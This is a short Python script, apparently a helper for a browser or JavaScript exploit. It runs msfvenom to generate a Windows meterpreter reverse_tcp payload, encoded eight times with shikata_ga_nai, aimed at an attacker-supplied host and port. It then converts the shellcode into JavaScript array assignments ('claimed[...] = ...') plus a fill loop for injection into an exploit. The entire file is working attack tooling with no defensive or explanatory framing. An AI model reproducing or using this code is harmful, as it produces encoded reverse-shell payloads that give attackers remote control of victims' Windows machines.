from os import popen
from sys import argv

arg = "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 8 --arch x86 --platform windows LHOST={} LPORT={} -f dw".format(argv[1],argv[2])
print arg
f = popen(arg)

temp =f.readlines()

lines=temp

#print lines

#raw_input()

while True:
    if ' \r\n' in lines:
        lines.remove(' \r\n')
    else: break
exp=[]

num=27
fmt ="claimed[{}] = {};"
for line in lines:
    #line_clear = line.strip(' \r\n')
    subline=line.split(',')
    #print len(subline)
    for i in range(0,len(subline)-1):
        #temp = fmt.format(num, line.strip(' \r\n'))
        temp = fmt.format(hex(num),subline[i].strip(' \r\n'))
        exp.append(temp)
        num += 1

last =  '''\n       for (var j = value; j < c_length; j++) {
            claimed[j] = 0x6d616e6a;
        }'''.replace("value", str(num))

print('\n'.join(exp)+last)
